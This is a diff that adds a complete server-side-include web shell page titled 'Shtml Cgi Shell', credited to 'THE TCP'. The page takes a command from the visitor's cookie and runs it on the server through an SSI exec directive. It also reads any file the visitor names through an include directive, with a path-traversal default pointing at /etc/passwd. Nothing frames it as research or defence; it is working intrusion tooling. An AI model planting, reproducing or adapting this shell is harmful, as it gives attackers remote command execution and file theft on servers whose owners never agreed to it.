@@ -1,0 +1,109 @@
+<!--#config errmsg="[Error, Maybe cause of the security of the server :(]"-->  
+<!--#config sizefmt="bytes"-->  
+
+<!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"GET\")" -->  
+    <!--#set var="shl" value="ls -al" -->  
+<!--#else -->  
+    <!--#set var="shl" value=$HTTP_COOKIE -->  
+<!--#endif -->  
+
+<!--#if expr="(\"$HTTP_COOKIE\" = \"\") || (\"$REQUEST_METHOD\" != \"POST\")" -->  
+    <!--#set var="inc" value="/../../../../../../../etc/passwd" -->  
+<!--#else -->  
+    <!--#set var="inc" value=$HTTP_COOKIE -->  
+<!--#endif -->  
+<html> 
+<head> 
+<meta http-equiv="Content-Language" content="en-us"> 
+<meta charset="UTF-8"/> 
+<title>Shtml Cgi Shell</title> 
+<style> 
+<!-- 
+body         { font-family: shell; font-size: 8pt } 
+--> 
+body {font-family: shell; font-size: 9pt;background-color:#222222;color:#009900;text-shadow:0px 0px 1px black;} 
+a {font-size:15px;color:#009900;} 
+.area { color: #00bb00; font-size: 9pt; text-shadow:#000000 0px 2px 7px; border: solid 0px #007700; background-color:transparent; box-shadow: 0px 0px 4px #009900;    padding: 3px;   -webkit-border-radius: 4px;   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(0,119,0) 0px 0px 4px;   -moz-box-shadow: rgb(0,119,0) 0px 0px 4px; }
+input[type=submit]{ padding: 3px; color: #00770;  font-weight: bold; text-align: center;  text-shadow: 0 1px rgba(255, 255, 255, 0.3);  background: #aeaeae;  background-clip: padding-box;  border: 1px solid #284473;  border-bottom-color: #223b66;  border-radius: 4px;  cursor: pointer;  background-image:-webkit-linear-gradient(top, #eaeaea, #d0d0d0);  background-image: -moz-linear-gradient(top, #eaeaea, #d0d0d0);  background-image: -o-linear-gradient(top, #eaeaea, #d0d0d0);  background-image: linear-gradient(to bottom, #eaeaea, #d0d0d0);  -webkit-box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15);  box-shadow: inset 0 1px rgba(255, 255, 255, 0.5), inset 0 0 7px rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.15); }
+input[type=text]{ padding: 3px; color: #009900; text-shadow: #777777 0px 0px 3px; border: 1px solid #007700; background: transparent; box-shadow: 0px 0px 4px #007700;    padding: 3px;   -webkit-border-radius: 4px;
+   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgb(85,85,85) 0px 0px 4px;   -moz-box-shadow: rgb(85,85,85) 0px 0px 4px;}
+input[type=submit]:hover, input[type=text]:hover{ color: #ffffff; text-shadow: #006600 0px 0px 4px; box-shadow: 0px 0px 4px #00dd00; border: 1px solid #00dd00;    padding: 3px;   -webkit-border-radius: 4px;
+   -moz-border-radius: 4px;   border-radius: 4px;   -webkit-box-shadow: rgba(0,119,0) 0px 0px 4px;   -moz-box-shadow: rgba(0,119,0) 0px 0px 4px;}
+</style> 
+<script language="javascript">  
+function doit( mode ) {  
+    if( document.cookie != "" ) {  
+        var cookies = document.cookie.split( ";" );  
+        for( var i = 0; i < cookies.length; ++i )   
+            document.cookie = cookies[ i ] + ";expires=Thu, 01 Jan 1970 00:00:00 GMT";  
+    }  
+    document.cookie = document.getElementById( mode ).value;  
+    document.location.reload();  
+}  
+function toggle( id ) {  
+    document.getElementById( id ).style.display = (document.getElementById( id ).style.display == "none") ? "block" : "none";  
+}  
+</script>  
+</head> 
+<body> 
+<div align="center"> 
+    <table border="1" width="100%" id="table1" style="border: 1px dotted #007700" cellspacing="0" cellpadding="0" height="502"> 
+        <tr> 
+            <td style="border: 1px dotted #007700" valign="top" rowspan="2"> 
+                <p align="center"><b> 
+                <font face="shell" size="2"><br> 
+                </font> 
+                <font color="#e6e6e6" face="shell" size="2"> 
+                <span style="text-decoration: none"> 
+                <font color="#00bb00"> 
+                <span style="text-decoration: none"><font onclick="toggle('inf');" style="cursor:hand;" color="#009900">Server Details</font></span></font></span></font></b></p> 
+                <p align="center"><b> 
+                <font onclick="toggle('shl');" style="cursor:hand;" face="shell" size="2" color="#009900"> 
+                <span style="text-decoration: none">Command</span></font></b></p> 
+                <p align="center"><b> 
+                <font face="shell" size="2" color="#00bb00"> 
+                <span style="text-decoration: none"><font onclick="toggle('inc');" style="cursor:hand;" color="#009900">View Files</font></span></font></b></p> 
+                <p>&nbsp;<p align="center">&nbsp;</td> 
+            <td height="422" width="82%" style="border: 1px dotted #007700" align="center"> 
+            <font color='#009900' size='2'>Sofware : <!--#echo var="SERVER_SOFTWARE" --><br>IP :<!--#echo var="REMOTE_ADDR" --></font><br> 
+            <font face='Arial Black' color='#009900' size='1'> 
+***************************************************************************<br> 
+<div id="inf" style=""><br>  
+<b><font color="#00bb00">Connect Server</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var="SERVER_NAME" --></b><br>  
+<b><font color="#00bb00">Remote Ip</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var="REMOTE_ADDR" --></b><br>  
+<b><font color="#00bb00">Server Software</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var="SERVER_SOFTWARE" --></b><br> 
+<b><font color="#00bb00">Current Dir</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var="DOCUMENT_ROOT" --></b><br>  
+<br></div> 
+<div  border="0" id="shl" style=""<!--#if expr="\"$REQUEST_METHOD\" != \"GET\"" -->display:block;<!--#endif -->>  
+<br><b><font color="#00bb00">Enter command</font></b>:&nbsp;&nbsp;&nbsp;<form method=get onsubmit=doit('command');><input type=text size=80 value=dir id=command>&nbsp;<input type=submit value=Command></form><br>  
+<center><b><font size=+1>Results</font></b></center>  
+<br>  
+<b><font color="#00bb00">Execute command</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=shl --></b><br>  
+<textarea class="area" cols="121" rows="15">  
+<!--#exec cmd=$shl -->  
+</textarea>  
+</div>  
+<div id="inc" style="display:none"><!--#if expr="\"$REQUEST_METHOD\" != \"POST\"" --><!--#endif --><br>  
+<b><font color="#00bb00">Enter The File Name </font></b>:&nbsp;&nbsp;&nbsp;<form method=post onsubmit=doit('vfile');><input type=text size=80 id=vfile>&nbsp;<input type=submit value=Run></form><br>  
+<b><font color="#00bb00">Open File</font></b>:&nbsp;&nbsp;&nbsp;<b><!--#echo var=inc --></b><br>  
+<b><font color="#00bb00">Size </font></b>:&nbsp;&nbsp;&nbsp;<b><!--#fsize virtual=$inc -->&nbsp;bytes</b><br>  
+<textarea class="area" cols="121" rows="15">  
+<!--#include virtual=$inc -->  
+</textarea>  
+<br></div>  
+***************************************************************************</font></span></p> 
+
+             
+            </td> 
+        </tr> 
+        <tr> 
+            <td style="border: 2px dotted #007700"> 
+            <p align="center"><font color="green" size="2" face="impact"><br> 
+            <br><a href="http://fb.com/tcp.net">THE TCP</a> 
+                  <br> 
+            </font></td> 
+        </tr> 
+    </table> 
+</div> 
+</body> 
+</html>  
